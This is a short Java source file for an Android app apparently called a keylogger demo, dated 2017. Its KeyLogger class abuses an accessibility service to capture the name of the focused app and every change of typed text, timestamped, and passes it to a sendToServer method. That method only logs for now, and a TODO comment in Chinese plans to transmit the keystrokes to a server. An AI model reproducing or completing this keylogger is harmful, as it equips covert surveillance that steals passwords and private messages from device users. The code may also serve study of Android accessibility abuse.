package com.dlive.keyloggerdemo.KeyLogger;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by dtz on 2017/1/12.
 */
public class KeyLogger extends AccessibilityService {

    @Override
    protected void onServiceConnected()
    {
        super.onServiceConnected();
        Log.d("keylogger", "Service Connected");
    }

    @SuppressLint("NewApi")
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        switch (eventType) {

            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                String packageName = "[PackageName]" + (String) event.getPackageName();
                this.sendToServer(packageName);
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//设置日期格式
                String currentTime = "[" + dateFormat.format(new Date()) + "]";// new Date()为获取当前系统时间
                String text = currentTime + event.getText().toString();
                this.sendToServer(text);
                break;
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {}

    //// TODO: 2017/1/12 调用通信模块向服务器发送键盘记录信息
    public void sendToServer(String data){
        Log.d("keylogger", data);
    }
}